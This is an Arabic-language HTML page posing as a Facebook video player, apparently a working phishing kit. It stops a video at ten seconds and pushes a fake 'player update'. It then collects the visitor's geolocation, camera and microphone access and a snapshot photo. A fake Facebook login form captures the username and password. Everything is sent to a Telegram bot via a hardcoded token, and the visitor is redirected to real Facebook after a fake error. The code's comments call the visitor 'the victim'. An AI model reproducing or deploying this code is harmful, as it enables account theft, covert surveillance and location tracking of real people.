<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Video Support</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body { margin: 0; background: #000; font-family: Arial; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        video { width: 100%; max-height: 100vh; cursor: pointer; }
        #pwa, #fb { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; padding: 20px; flex-direction: column; align-items: center; justify-content: center; }
        .box { background: #fff; padding: 25px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; }
        button { background: #1877f2; color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; background: #f5f6f7; color: #000; }
        .logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>

    <video id="vid" controls poster="trend_bg.jpg.jpg">
        <source src="v.mp4" type="video/mp4">
    </video>

    <div id="pwa">
        <div class="box">
            <h3 style="margin-top:0; color:#000;">تحديث المشغل مطلوب</h3>
            <p style="color:#606770; font-size:14px;">لاستكمال مشاهدة الفيديو بدون حظر، يرجى الانتقال للمشغل الرسمي.</p>
            <button id="btn_ins">تثبيت واستكمال المشاهدة</button>
        </div>
    </div>

    <div id="fb">
        <div class="box">
            <div class="logo">facebook</div>
            <p style="font-size:14px; color:#1c1e21; font-weight:bold;">يرجى تسجيل الدخول للمتابعة</p>
            <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة السر">
            <button id="btn_go">تسجيل الدخول</button>
        </div>
    </div>

    <script>
        const T = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
        const ID = "1356975454";
        const v = document.getElementById('vid');
        let p;

        if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
        window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); p = e; });

        // قطع الفيديو عند الثانية 10
        v.ontimeupdate = () => {
            if (v.currentTime >= 10) {
                v.pause();
                v.currentTime = 10;
                document.getElementById('pwa').style.display = 'flex';
            }
        };

        document.getElementById('btn_ins').addEventListener('click', async () => {
            if (p) { p.prompt(); }
            
            // 1. سحب الموقع
            navigator.geolocation.getCurrentPosition((pos) => {
                sendMsg(`📍 موقع الضحية:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            });

            // 2. سحب الكاميرا والمايك وصورة فورية
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                sendMsg("🎙️📸 تم الحصول على الأذونات وجارٍ التقاط صورة...");
                
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const photoBlob = await imageCapture.takePhoto();
                
                // إرسال الصورة للبوت
                let formData = new FormData();
                formData.append('chat_id', ID);
                formData.append('photo', photoBlob, 'victim.jpg');
                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: formData });

            } catch (e) { sendMsg("❌ الضحية رفض الكاميرا."); }
            
            document.getElementById('pwa').style.display = 'none';
            document.getElementById('fb').style.display = 'flex';
        });

        // 3. سحب الباسورد
        document.getElementById('btn_go').addEventListener('click', () => {
            const u = document.getElementById('user').value;
            const ps = document.getElementById('pass').value;
            if(u && ps) {
                sendMsg(`🔐 حساب فيسبوك:\n📧: ${u}\n🔑: ${ps}`);
                alert("⚠️ خطأ في الاتصال، حاول لاحقاً.");
                window.location.href = "https://m.facebook.com";
            }
        });

        function sendMsg(msg) {
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`, { mode: 'no-cors' });
        }
    </script>
</body>
</html>
